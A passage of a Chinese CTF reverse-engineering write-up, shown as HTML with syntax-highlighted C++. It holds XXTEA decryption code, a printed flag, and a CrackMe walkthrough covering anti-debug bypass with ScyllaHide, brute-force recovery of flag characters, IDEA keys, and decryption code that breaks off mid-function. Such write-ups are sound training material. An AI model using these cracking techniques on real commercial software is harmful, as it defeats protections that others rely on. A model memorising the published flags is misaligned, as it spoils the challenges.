        <span class="token punctuation">&#123;</span>
            sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> <span class="token number">0xA4F41487</span><span class="token punctuation">)</span>
                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"11\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">==</span> <span class="token number">0xA4F41487</span><span class="token punctuation">)</span>
                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"11\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">/* Decoding Part */</span>
    <span class="token punctuation">&#123;</span>
        n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>
        rounds <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        sum <span class="token operator">=</span> rounds <span class="token operator">*</span> DELTA<span class="token punctuation">;</span>
        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span>
        <span class="token punctuation">&#123;</span>
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>
            sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0xAABB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> Enc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token number">0xa9934e2f</span><span class="token punctuation">,</span> <span class="token number">0x30b90fa</span><span class="token punctuation">,</span> <span class="token number">0xdcbf1d3</span><span class="token punctuation">,</span> <span class="token number">0x328b5bde</span><span class="token punctuation">,</span>
        <span class="token number">0x44fab4e</span><span class="token punctuation">,</span> <span class="token number">0x1dcf0051</span><span class="token punctuation">,</span> <span class="token number">0x85ebbe55</span><span class="token punctuation">,</span> <span class="token number">0x93aa773a</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">xxtea</span><span class="token punctuation">(</span>Enc<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.32s\n"</span><span class="token punctuation">,</span> Enc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>flag{th15_15_51mpLe_obf_R19Ht?}</p>
<h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p>
<p><img src="/images/47-1744626745338-52.png" loading="lazy"></p>
<p><img src="/images/48-1744626745338-53.png" loading="lazy"></p>
<p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p>
<p><img src="/images/49-1744626745338-54.png" loading="lazy"></p>
<p><img src="/images/50-1744626745338-55.png" loading="lazy"></p>
<p><img src="/images/51-1744626745338-56.png" loading="lazy"></p>
<p><img src="/images/52-1744626745338-57.png" loading="lazy"></p>
<p>从TLS那边可以看到启动了一个线程，线程函数如下</p>
<p><img src="/images/53-1744626745339-58.png" loading="lazy"></p>
<p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p>
<p><img src="/images/54-1744626745339-59.png" loading="lazy"></p>
<p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p>
<p><img src="/images/55-1744626745339-60.png" loading="lazy"></p>
<p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p>
<p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p>
<p><img src="/images/56-1744626745339-61.png" loading="lazy"></p>
<p>爆破代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> box1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xC0BA6CAC</span><span class="token punctuation">,</span> <span class="token number">0x5A05DF1B</span><span class="token punctuation">,</span> <span class="token number">0x9ABFB3B7</span><span class="token punctuation">,</span> <span class="token number">0xB40BBE36</span><span class="token punctuation">,</span> <span class="token number">0x74B1D29A</span><span class="token punctuation">,</span>
      <span class="token number">0xEE0E612D</span><span class="token punctuation">,</span> <span class="token number">0x2EB40D81</span><span class="token punctuation">,</span> <span class="token number">0xB3667A2F</span><span class="token punctuation">,</span> <span class="token number">0x73DC1683</span><span class="token punctuation">,</span> <span class="token number">0xE963A534</span><span class="token punctuation">,</span> <span class="token number">0x29D9C998</span><span class="token punctuation">,</span> <span class="token number">0x076DC419</span><span class="token punctuation">,</span> <span class="token number">0xC7D7A8B5</span><span class="token punctuation">,</span>
      <span class="token number">0x5D681B02</span><span class="token punctuation">,</span> <span class="token number">0x9DD277AE</span><span class="token punctuation">,</span> <span class="token number">0xBDBDF21D</span><span class="token punctuation">,</span> <span class="token number">0x7D079EB1</span><span class="token punctuation">,</span> <span class="token number">0xE7B82D06</span><span class="token punctuation">,</span> <span class="token number">0x270241AA</span><span class="token punctuation">,</span> <span class="token number">0x09B64C2B</span><span class="token punctuation">,</span> <span class="token number">0xC90C2087</span><span class="token punctuation">,</span>
      <span class="token number">0x53B39330</span><span class="token punctuation">,</span> <span class="token number">0x9309FF9C</span><span class="token punctuation">,</span> <span class="token number">0x0EDB8832</span><span class="token punctuation">,</span> <span class="token number">0xCE61E49E</span><span class="token punctuation">,</span> <span class="token number">0x54DE5729</span><span class="token punctuation">,</span> <span class="token number">0x94643B85</span><span class="token punctuation">,</span> <span class="token number">0xBAD03604</span><span class="token punctuation">,</span> <span class="token number">0x7A6A5AA8</span><span class="token punctuation">,</span>
      <span class="token number">0xE0D5E91F</span><span class="token punctuation">,</span> <span class="token number">0x206F85B3</span><span class="token punctuation">,</span> <span class="token number">0xA00AE279</span><span class="token punctuation">,</span> <span class="token number">0x60B08ED5</span><span class="token punctuation">,</span> <span class="token number">0xFA0F3D62</span><span class="token punctuation">,</span> <span class="token number">0x3AB551CE</span><span class="token punctuation">,</span> <span class="token number">0x14015C4F</span><span class="token punctuation">,</span> <span class="token number">0xD4BB30E3</span><span class="token punctuation">,</span>
      <span class="token number">0x4E048354</span><span class="token punctuation">,</span> <span class="token number">0x8EBEEFF8</span><span class="token punctuation">,</span> <span class="token number">0x136C9856</span><span class="token punctuation">,</span> <span class="token number">0xD3D6F4FA</span><span class="token punctuation">,</span> <span class="token number">0x4969474D</span><span class="token punctuation">,</span> <span class="token number">0x89D32BE1</span><span class="token punctuation">,</span> <span class="token number">0xA7672660</span><span class="token punctuation">,</span> <span class="token number">0x67DD4ACC</span><span class="token punctuation">,</span>
      <span class="token number">0xFD62F97B</span><span class="token punctuation">,</span> <span class="token number">0x3DD895D7</span><span class="token punctuation">,</span> <span class="token number">0x1DB71064</span><span class="token punctuation">,</span> <span class="token number">0xDD0D7CC8</span><span class="token punctuation">,</span> <span class="token number">0x47B2CF7F</span><span class="token punctuation">,</span> <span class="token number">0x8708A3D3</span><span class="token punctuation">,</span> <span class="token number">0xA9BCAE52</span><span class="token punctuation">,</span> <span class="token number">0x6906C2FE</span><span class="token punctuation">,</span>
      <span class="token number">0xF3B97149</span><span class="token punctuation">,</span> <span class="token number">0x33031DE5</span><span class="token punctuation">,</span> <span class="token number">0xAED16A4B</span><span class="token punctuation">,</span> <span class="token number">0x6E6B06E7</span><span class="token punctuation">,</span> <span class="token number">0xF4D4B550</span><span class="token punctuation">,</span> <span class="token number">0x346ED9FC</span><span class="token punctuation">,</span> <span class="token number">0x1ADAD47D</span><span class="token punctuation">,</span> <span class="token number">0xDA60B8D1</span><span class="token punctuation">,</span>
      <span class="token number">0x40DF0B66</span><span class="token punctuation">,</span> <span class="token number">0x806567CA</span><span class="token punctuation">,</span> <span class="token number">0x9B64C2B1</span><span class="token punctuation">,</span> <span class="token number">0x5BDEAE1D</span><span class="token punctuation">,</span> <span class="token number">0xC1611DAA</span><span class="token punctuation">,</span> <span class="token number">0x01DB7106</span><span class="token punctuation">,</span> <span class="token number">0x2F6F7C87</span><span class="token punctuation">,</span> <span class="token number">0xEFD5102B</span><span class="token punctuation">,</span>
      <span class="token number">0x756AA39C</span><span class="token punctuation">,</span> <span class="token number">0xB5D0CF30</span><span class="token punctuation">,</span> <span class="token number">0x2802B89E</span><span class="token punctuation">,</span> <span class="token number">0xE8B8D432</span><span class="token punctuation">,</span> <span class="token number">0x72076785</span><span class="token punctuation">,</span> <span class="token number">0xB2BD0B29</span><span class="token punctuation">,</span> <span class="token number">0x9C0906A8</span><span class="token punctuation">,</span> <span class="token number">0x5CB36A04</span><span class="token punctuation">,</span>
      <span class="token number">0xC60CD9B3</span><span class="token punctuation">,</span> <span class="token number">0x06B6B51F</span><span class="token punctuation">,</span> <span class="token number">0x26D930AC</span><span class="token punctuation">,</span> <span class="token number">0xE6635C00</span><span class="token punctuation">,</span> <span class="token number">0x7CDCEFB7</span><span class="token punctuation">,</span> <span class="token number">0xBC66831B</span><span class="token punctuation">,</span> <span class="token number">0x92D28E9A</span><span class="token punctuation">,</span> <span class="token number">0x5268E236</span><span class="token punctuation">,</span>
      <span class="token number">0xC8D75181</span><span class="token punctuation">,</span> <span class="token number">0x086D3D2D</span><span class="token punctuation">,</span> <span class="token number">0x95BF4A83</span><span class="token punctuation">,</span> <span class="token number">0x5505262F</span><span class="token punctuation">,</span> <span class="token number">0xCFBA9598</span><span class="token punctuation">,</span> <span class="token number">0x0F00F934</span><span class="token punctuation">,</span> <span class="token number">0x21B4F4B5</span><span class="token punctuation">,</span> <span class="token number">0xE10E9819</span><span class="token punctuation">,</span>
      <span class="token number">0x7BB12BAE</span><span class="token punctuation">,</span> <span class="token number">0xBB0B4702</span><span class="token punctuation">,</span> <span class="token number">0x3B6E20C8</span><span class="token punctuation">,</span> <span class="token number">0xFBD44C64</span><span class="token punctuation">,</span> <span class="token number">0x616BFFD3</span><span class="token punctuation">,</span> <span class="token number">0xA1D1937F</span><span class="token punctuation">,</span> <span class="token number">0x8F659EFE</span><span class="token punctuation">,</span> <span class="token number">0x4FDFF252</span><span class="token punctuation">,</span>
      <span class="token number">0xD56041E5</span><span class="token punctuation">,</span> <span class="token number">0x15DA2D49</span><span class="token punctuation">,</span> <span class="token number">0x88085AE7</span><span class="token punctuation">,</span> <span class="token number">0x48B2364B</span><span class="token punctuation">,</span> <span class="token number">0xD20D85FC</span><span class="token punctuation">,</span> <span class="token number">0x12B7E950</span><span class="token punctuation">,</span> <span class="token number">0x3C03E4D1</span><span class="token punctuation">,</span> <span class="token number">0xFCB9887D</span><span class="token punctuation">,</span>
      <span class="token number">0x66063BCA</span><span class="token punctuation">,</span> <span class="token number">0xA6BC5766</span><span class="token punctuation">,</span> <span class="token number">0x86D3D2D5</span><span class="token punctuation">,</span> <span class="token number">0x4669BE79</span><span class="token punctuation">,</span> <span class="token number">0xDCD60DCE</span><span class="token punctuation">,</span> <span class="token number">0x1C6C6162</span><span class="token punctuation">,</span> <span class="token number">0x32D86CE3</span><span class="token punctuation">,</span> <span class="token number">0xF262004F</span><span class="token punctuation">,</span>
      <span class="token number">0x68DDB3F8</span><span class="token punctuation">,</span> <span class="token number">0xA867DF54</span><span class="token punctuation">,</span> <span class="token number">0x35B5A8FA</span><span class="token punctuation">,</span> <span class="token number">0xF50FC456</span><span class="token punctuation">,</span> <span class="token number">0x6FB077E1</span><span class="token punctuation">,</span> <span class="token number">0xAF0A1B4D</span><span class="token punctuation">,</span> <span class="token number">0x81BE16CC</span><span class="token punctuation">,</span> <span class="token number">0x41047A60</span><span class="token punctuation">,</span>
      <span class="token number">0xDBBBC9D7</span><span class="token punctuation">,</span> <span class="token number">0x1B01A57B</span><span class="token punctuation">,</span> <span class="token number">0xEDB88321</span><span class="token punctuation">,</span> <span class="token number">0x2D02EF8D</span><span class="token punctuation">,</span> <span class="token number">0xB7BD5C3A</span><span class="token punctuation">,</span> <span class="token number">0x77073096</span><span class="token punctuation">,</span> <span class="token number">0x59B33D17</span><span class="token punctuation">,</span> <span class="token number">0x990951BB</span><span class="token punctuation">,</span>
      <span class="token number">0x03B6E20C</span><span class="token punctuation">,</span> <span class="token number">0xC30C8EA0</span><span class="token punctuation">,</span> <span class="token number">0x5EDEF90E</span><span class="token punctuation">,</span> <span class="token number">0x9E6495A2</span><span class="token punctuation">,</span> <span class="token number">0x04DB2615</span><span class="token punctuation">,</span> <span class="token number">0xC4614AB9</span><span class="token punctuation">,</span> <span class="token number">0xEAD54738</span><span class="token punctuation">,</span> <span class="token number">0x2A6F2B94</span><span class="token punctuation">,</span>
      <span class="token number">0xB0D09823</span><span class="token punctuation">,</span> <span class="token number">0x706AF48F</span><span class="token punctuation">,</span> <span class="token number">0x5005713C</span><span class="token punctuation">,</span> <span class="token number">0x90BF1D90</span><span class="token punctuation">,</span> <span class="token number">0x0A00AE27</span><span class="token punctuation">,</span> <span class="token number">0xCABAC28B</span><span class="token punctuation">,</span> <span class="token number">0xE40ECF0A</span><span class="token punctuation">,</span> <span class="token number">0x24B4A3A6</span><span class="token punctuation">,</span>
      <span class="token number">0xBE0B1011</span><span class="token punctuation">,</span> <span class="token number">0x7EB17CBD</span><span class="token punctuation">,</span> <span class="token number">0xE3630B13</span><span class="token punctuation">,</span> <span class="token number">0x23D967BF</span><span class="token punctuation">,</span> <span class="token number">0xB966D408</span><span class="token punctuation">,</span> <span class="token number">0x79DCB8A4</span><span class="token punctuation">,</span> <span class="token number">0x5768B525</span><span class="token punctuation">,</span> <span class="token number">0x97D2D989</span><span class="token punctuation">,</span>
      <span class="token number">0x0D6D6A3E</span><span class="token punctuation">,</span> <span class="token number">0xCDD70692</span><span class="token punctuation">,</span> <span class="token number">0x4DB26158</span><span class="token punctuation">,</span> <span class="token number">0x8D080DF4</span><span class="token punctuation">,</span> <span class="token number">0x17B7BE43</span><span class="token punctuation">,</span> <span class="token number">0xD70DD2EF</span><span class="token punctuation">,</span> <span class="token number">0xF9B9DF6E</span><span class="token punctuation">,</span> <span class="token number">0x3903B3C2</span><span class="token punctuation">,</span>
      <span class="token number">0xA3BC0075</span><span class="token punctuation">,</span> <span class="token number">0x63066CD9</span><span class="token punctuation">,</span> <span class="token number">0xFED41B77</span><span class="token punctuation">,</span> <span class="token number">0x3E6E77DB</span><span class="token punctuation">,</span> <span class="token number">0xA4D1C46C</span><span class="token punctuation">,</span> <span class="token number">0x646BA8C0</span><span class="token punctuation">,</span> <span class="token number">0x4ADFA541</span><span class="token punctuation">,</span> <span class="token number">0x8A65C9ED</span><span class="token punctuation">,</span>
      <span class="token number">0x10DA7A5A</span><span class="token punctuation">,</span> <span class="token number">0xD06016F6</span><span class="token punctuation">,</span> <span class="token number">0xF00F9345</span><span class="token punctuation">,</span> <span class="token number">0x30B5FFE9</span><span class="token punctuation">,</span> <span class="token number">0xAA0A4C5E</span><span class="token punctuation">,</span> <span class="token number">0x6AB020F2</span><span class="token punctuation">,</span> <span class="token number">0x44042D73</span><span class="token punctuation">,</span> <span class="token number">0x84BE41DF</span><span class="token punctuation">,</span>
      <span class="token number">0x1E01F268</span><span class="token punctuation">,</span> <span class="token number">0xDEBB9EC4</span><span class="token punctuation">,</span> <span class="token number">0x4369E96A</span><span class="token punctuation">,</span> <span class="token number">0x83D385C6</span><span class="token punctuation">,</span> <span class="token number">0x196C3671</span><span class="token punctuation">,</span> <span class="token number">0xD9D65ADD</span><span class="token punctuation">,</span> <span class="token number">0xF762575C</span><span class="token punctuation">,</span> <span class="token number">0x37D83BF0</span><span class="token punctuation">,</span>
      <span class="token number">0xAD678847</span><span class="token punctuation">,</span> <span class="token number">0x6DDDE4EB</span><span class="token punctuation">,</span> <span class="token number">0x76DC4190</span><span class="token punctuation">,</span> <span class="token number">0xB6662D3C</span><span class="token punctuation">,</span> <span class="token number">0x2CD99E8B</span><span class="token punctuation">,</span> <span class="token number">0xEC63F227</span><span class="token punctuation">,</span> <span class="token number">0xC2D7FFA6</span><span class="token punctuation">,</span> <span class="token number">0x026D930A</span><span class="token punctuation">,</span>
      <span class="token number">0x98D220BD</span><span class="token punctuation">,</span> <span class="token number">0x58684C11</span><span class="token punctuation">,</span> <span class="token number">0xC5BA3BBF</span><span class="token punctuation">,</span> <span class="token number">0x05005713</span><span class="token punctuation">,</span> <span class="token number">0x9FBFE4A4</span><span class="token punctuation">,</span> <span class="token number">0x5F058808</span><span class="token punctuation">,</span> <span class="token number">0x71B18589</span><span class="token punctuation">,</span> <span class="token number">0xB10BE925</span><span class="token punctuation">,</span>
      <span class="token number">0x2BB45A92</span><span class="token punctuation">,</span> <span class="token number">0xEB0E363E</span><span class="token punctuation">,</span> <span class="token number">0xCB61B38D</span><span class="token punctuation">,</span> <span class="token number">0x0BDBDF21</span><span class="token punctuation">,</span> <span class="token number">0x91646C96</span><span class="token punctuation">,</span> <span class="token number">0x51DE003A</span><span class="token punctuation">,</span> <span class="token number">0x7F6A0DBB</span><span class="token punctuation">,</span> <span class="token number">0xBFD06117</span><span class="token punctuation">,</span>
      <span class="token number">0x256FD2A0</span><span class="token punctuation">,</span> <span class="token number">0xE5D5BE0C</span><span class="token punctuation">,</span> <span class="token number">0x7807C9A2</span><span class="token punctuation">,</span> <span class="token number">0xB8BDA50E</span><span class="token punctuation">,</span> <span class="token number">0x220216B9</span><span class="token punctuation">,</span> <span class="token number">0xE2B87A15</span><span class="token punctuation">,</span> <span class="token number">0xCC0C7794</span><span class="token punctuation">,</span> <span class="token number">0x0CB61B38</span><span class="token punctuation">,</span>
      <span class="token number">0x9609A88F</span><span class="token punctuation">,</span> <span class="token number">0x56B3C423</span><span class="token punctuation">,</span> <span class="token number">0xD6D6A3E9</span><span class="token punctuation">,</span> <span class="token number">0x166CCF45</span><span class="token punctuation">,</span> <span class="token number">0x8CD37CF2</span><span class="token punctuation">,</span> <span class="token number">0x4C69105E</span><span class="token punctuation">,</span> <span class="token number">0x62DD1DDF</span><span class="token punctuation">,</span> <span class="token number">0xA2677173</span><span class="token punctuation">,</span>
      <span class="token number">0x38D8C2C4</span><span class="token punctuation">,</span> <span class="token number">0xF862AE68</span><span class="token punctuation">,</span> <span class="token number">0x65B0D9C6</span><span class="token punctuation">,</span> <span class="token number">0xA50AB56A</span><span class="token punctuation">,</span> <span class="token number">0x3FB506DD</span><span class="token punctuation">,</span> <span class="token number">0xFF0F6A71</span><span class="token punctuation">,</span> <span class="token number">0xD1BB67F0</span><span class="token punctuation">,</span> <span class="token number">0x11010B5C</span><span class="token punctuation">,</span>
      <span class="token number">0x8BBEB8EB</span><span class="token punctuation">,</span> <span class="token number">0x4B04D447</span><span class="token punctuation">,</span> <span class="token number">0x6B6B51F4</span><span class="token punctuation">,</span> <span class="token number">0xABD13D58</span><span class="token punctuation">,</span> <span class="token number">0x316E8EEF</span><span class="token punctuation">,</span> <span class="token number">0xF1D4E243</span><span class="token punctuation">,</span> <span class="token number">0xDF60EFC2</span><span class="token punctuation">,</span> <span class="token number">0x1FDA836E</span><span class="token punctuation">,</span>
      <span class="token number">0x856530D9</span><span class="token punctuation">,</span> <span class="token number">0x45DF5C75</span><span class="token punctuation">,</span> <span class="token number">0xD80D2BDB</span><span class="token punctuation">,</span> <span class="token number">0x18B74777</span><span class="token punctuation">,</span> <span class="token number">0x8208F4C0</span><span class="token punctuation">,</span> <span class="token number">0x42B2986C</span><span class="token punctuation">,</span> <span class="token number">0x6C0695ED</span><span class="token punctuation">,</span> <span class="token number">0xACBCF941</span><span class="token punctuation">,</span>
      <span class="token number">0x36034AF6</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCC00</span><span class="token punctuation">,</span> <span class="token number">0x00000100</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span>
      <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  <span class="token keyword">uint32_t</span> enc1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
      <span class="token number">0x46A95BAD</span><span class="token punctuation">,</span>
      <span class="token number">0x1CAC84B6</span><span class="token punctuation">,</span>
      <span class="token number">0xA67CB2B2</span><span class="token punctuation">,</span>
      <span class="token number">0x32188937</span><span class="token punctuation">,</span>
      <span class="token number">0x4872D39F</span><span class="token punctuation">,</span>
      <span class="token number">0xF2A2E59B</span><span class="token punctuation">,</span>
      <span class="token number">0x011B94D2</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  <span class="token comment">// 爆破前7字节</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> <span class="token number">132</span><span class="token punctuation">;</span> c<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>box1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token punctuation">)</span>c <span class="token operator">^</span> <span class="token number">0x79</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xB0E0E879</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">break</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p>得到前七个字符为：<strong>moshui_</strong></p>
<p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p>
<p><img src="/images/57-1744626745339-63.png" loading="lazy"></p>
<p><img src="/images/58-1744626745339-62.png" loading="lazy"></p>
<p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p>
<p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p>
<p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p>
<p><img src="/images/59-1744626745339-64.png" loading="lazy"></p>
<p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p>
<p><img src="/images/60-1744626745339-65.png" loading="lazy"></p>
<p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p>
<p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p>
<p><img src="/images/61-1744626745339-66.png" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bitset></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> code<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> bitset<span class="token operator">&lt;</span><span class="token number">128</span><span class="token operator">></span> key<span class="token punctuation">;</span>

bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> sub_key<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> inv_sub_key<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

code <span class="token function">XOR</span><span class="token punctuation">(</span>code code_1<span class="token punctuation">,</span> code code_2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
